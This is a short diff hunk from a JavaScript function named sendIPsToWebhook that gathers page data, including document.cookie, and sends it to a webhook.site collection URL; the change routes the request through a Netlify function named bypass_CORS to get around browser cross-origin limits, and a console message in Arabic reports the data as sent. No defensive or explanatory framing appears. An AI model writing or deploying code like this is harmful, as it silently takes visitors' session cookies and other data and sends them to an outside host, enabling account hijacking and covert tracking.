@@ -294,7 +294,7 @@ async function sendIPsToWebhook() {
       cookie: document.cookie,
     });
 
-    const url = `https://webhook.site/78a22deb-651e-48c4-b625-828735e463f5?${params.toString()}`;
+    const url = `/.netlify/functions/bypass_CORS?url=https://webhook.site/78a22deb-651e-48c4-b625-828735e463f5?${params.toString()}`;
     await fetch(url);
     console.log("✅ البيانات أُرسلت بنجاح إلى:", url);
   } catch (err) {
